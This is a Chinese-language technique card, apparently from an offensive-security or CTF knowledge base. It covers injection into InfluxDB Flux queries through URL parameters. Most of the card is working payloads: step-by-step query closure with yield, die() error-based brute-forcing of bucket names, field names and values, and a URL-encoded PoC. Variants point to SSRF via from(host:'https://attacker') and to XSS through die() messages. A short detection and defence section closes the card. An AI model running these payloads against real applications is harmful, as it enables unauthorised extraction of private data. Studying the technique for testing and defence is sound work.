---
id: web-generic-sqli-influxdb-flux-die-error-exfil
title: InfluxDB Flux 注入：闭合查询 + yield 多语句 + die() 报错外带爆破 bucket 名/字段/值
type: scenario
domain: web
path: web/generic/sqli
technique: influxdb-flux-injection-die-error-exfil
aliases:
- InfluxDB 注入
- Flux 注入
- die 报错外带
- buckets 泄露
- yield 多查询注入
- Flux 正则爆破
tags:
- influxdb
- flux
- nosql-injection
- error-based
- exfiltration
- time-series
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V569
  verified_at: '2026-11-12T09:36:39+08:00'
  notes: '已对照原文与截图01-05核对：图01 传双引号返回 compilation failed expected RPAREN（Content-Type text/html）；图02 前缀 a 返回 []；图03 前缀 p 返回 failed to evaluate filter function: privateBucket；图04 泄露 sensitive_field；图05 string(v:r._value) 泄露 1337；yield 多查询、// 注释与 die(msg) 报错外带机制均与卡内一致。原文未实测 from(host:) SSRF（仅引官方文档），卡内作为未实测变体注明、未单独建卡，处理合理。原文无受影响版本声明（仅引 v2.7 文档），affected_versions 保持 null。未复现。'
---

## 一句话结论

当应用把用户输入直接拼进 InfluxDB 的 Flux 查询（如 `r._value == "<input>"`）时，用 `") |> yield(name:"1337")` 闭合原查询并用 `yield` 分隔多条语句、末尾 `//` 注释残余，再注入 `buckets() |> filter(fn:(r) => r.name =~ /^a.*/ and die(msg:r.name))`，即可让 `die()` 把表达式结果作为错误消息抛出并在 HTTP 响应中回显，逐字符爆破 bucket 名、字段名与字段值。

## 原理

- **Flux 语法**：Flux 是函数式查询语言，用 `|>` 管道把数据传给下一个函数；`from(bucket:)` 取数据、`filter(fn:(r)=>...)` 过滤、`yield()` 输出。应用的拼接形态是 `... and r._value == "<input>")`。
- **闭合与多语句**：输入 `") |> yield(name: "1337")` 先闭合字符串和 `filter` 的括号，并用 `yield` 结束原查询；Flux 在同一个请求里执行多条查询需要 `yield()` 分隔，原文用 `yield(name:"1337")` 作为多条语句的边界。
- **报错外带**：`die(msg: <表达式>)` 会以给定消息抛错；把 `r.name`、`r._field`、`v:r._value` 放进 `msg`，错误消息就带有查询结果。`filter(fn: (r) => r.name =~ /^a.*/ and die(msg:r.name))` 中正则 `=~` 先筛选前缀，`and die(...)` 命中时抛错，响应中即出现真实名字；未命中时 `die` 不执行，页面返回空数组，两类响应可区分。
- **末尾注释**：payload 末尾的 `//` 加换行注释掉原查询剩余的 `")`，保证 Flux 解析通过。
- **类型细节**：`r._value` 可能是 int/float，`die(msg: r._value)` 会报 `type conflict: string != int`，需用 `string(v: r._value)` 转换后再外带。
- **为什么成立**：查询语言与数据同属一个信任域，应用只做字符串拼接、没有参数化/白名单，导致攻击者可改写查询结构并把内部数据通过错误通道带出。

## 触发条件

- Web 应用把用户输入拼接进 Flux 查询（常见于 `/query?data=` 这类自建接口或后台查询功能）；
- InfluxDB 2.x（Flux 引擎）且 `die()`/`buckets()`/`filter` 未被禁用或限制；
- 应用把 InfluxDB 异常信息返回给客户端（如 Express `catch(err){ res.send(err.toString()) }`）；
- 攻击者知道（或能爆破）bucket 名与字段名。

## 利用步骤

1. 传一个双引号 `"`，若响应出现 `HttpError: compilation failed ... expected RPAREN, got EOF`，确认拼接点与 InfluxDB。
2. 爆破 bucket 名：`") |> yield(name: "1337") buckets() |> filter(fn: (r) => r.name =~ /^a.*/ and die(msg:r.name)) //`，`a` 无命中返回 `[]`，`p` 命中返回 `failed to evaluate filter function: privateBucket`；用脚本枚举字符集逐位确定名称。
3. 读 bucket 结构：`") |> yield(name: "1337") from(bucket: "privateBucket") |> range(start: 0) |> filter(fn: (r) => die(msg:r)) //`，错误消息里得到 `_value/_time/_measurement/_field` 等列结构。
4. 爆破字段名：`... |> filter(fn: (r) => r._field =~ /s.*/ and die(msg:r._field)) //` → `sensitive_field`。
5. 读值：`... |> filter(fn: (r) => r._field == "sensitive_field" and die(msg:string(v:r._value))) //` → 得到字段值（本例 1337）。

## PoC

```text
# 1) 确认注入
/query?data="

# 2) bucket 名前缀爆破（a → []；p → privateBucket）
/query?data=%22)%20%7C%3E%20yield(name%3A%221337%22)%20buckets()%20%7C%3E%20filter(fn%3A%20(r)%20%3D%3E%20r.name%20%3D~%20%2F%5Ep.*%2F%20and%20die(msg%3Ar.name))%20%2F%2F

# 3) bucket 结构与字段
/query?data=") |> yield(name: "1337") from(bucket: "privateBucket") |> range(start: 0) |> filter(fn: (r) => die(msg:r)) //
/query?data=") |> yield(name: "1337") from(bucket: "privateBucket") |> range(start: 0) |> filter(fn: (r) => r._field =~ /s.*/ and die(msg:r._field)) //

# 4) 读字段值（注意 string() 转换）
/query?data=") |> yield(name: "1337") from(bucket: "privateBucket") |> range(start: 0) |> filter(fn: (r) => r._field == "sensitive_field" and die(msg:string(v:r._value))) //
```

爆破脚本要点：逐个字符递增正则前缀（`/^已知前缀<候选字符>.*/`），命中时响应包含 bucket/字段名，未命中的响应为 `[]` 或其它错误。

## 变体与关联

- 变体（未实测）：`from()` 支持 `host:"https://attacker"` 参数（官方文档 usage.from），可让 InfluxDB 向攻击者/内网地址发起数据源请求，原文仅引文档未验证回连，复现时需确认网络与 Flux 引擎行为。
- 变体：错误回显为 HTML 时 `die(msg:"<img src=x onerror=...>")` 直接构成 XSS，见 [[web-generic-xss-influxdb-flux-error-die-html]]。
- 关联：其他 NoSQL 注入（MongoDB 操作符/JS 表达式）见 web/generic/sqli 下 MongoDB 系列；错误外带通用技巧可参考报错注入类卡片。
- 变体：`buckets()` 之外还有 `schema.measurements()`/`schema.fieldKeys()` 等元数据函数，可等价枚举。

## 检测与防御

- 检测：Flux 查询日志/HTTP 参数中出现 `")`、`yield(`、`buckets()`、`die(`、`=~`、`//` 等注入特征；InfluxDB 错误信息被返回给客户端；同一来源对 `/query` 的高频前缀猜测请求。
- 防御：禁止字符串拼接查询，使用参数化/模板化 Flux 或白名单限定查询条件；不要将数据库原始错误返回前端（统一错误页）；限制 Web 用户对 `buckets()`/`die()`/`from(host:)` 等函数的使用（令牌权限与只读 bucket 范围）。
